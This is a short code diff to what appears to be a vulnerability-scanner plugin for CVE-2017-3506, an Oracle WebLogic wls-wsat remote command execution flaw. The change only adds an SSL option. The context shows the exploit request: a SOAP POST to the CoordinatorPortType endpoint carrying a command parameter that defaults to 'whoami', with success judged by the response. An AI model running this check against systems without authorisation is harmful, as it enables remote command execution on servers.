@@ -18,7 +18,7 @@ class CVE_2017_3506(Star):
     }
     type = target_type.VULNERABILITY
 
-    def light_up(self, dip, dport, cmd='whoami', *args, **kwargs) -> (bool, dict):
+    def light_up(self, dip, dport, force_ssl=None, cmd='whoami', *args, **kwargs) -> (bool, dict):
         url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
         data = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
@@ -41,6 +41,6 @@ class CVE_2017_3506(Star):
     </soapenv:Envelope>'''
 
         headers = {'Content-Type': 'text/xml'}
-        res, data = http(url, 'POST', headers, data=data, verify=False)
+        res, data = http(url, 'POST', headers, data=data, ssl=force_ssl)
         return res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text), {
             'msg': 'finish.'}
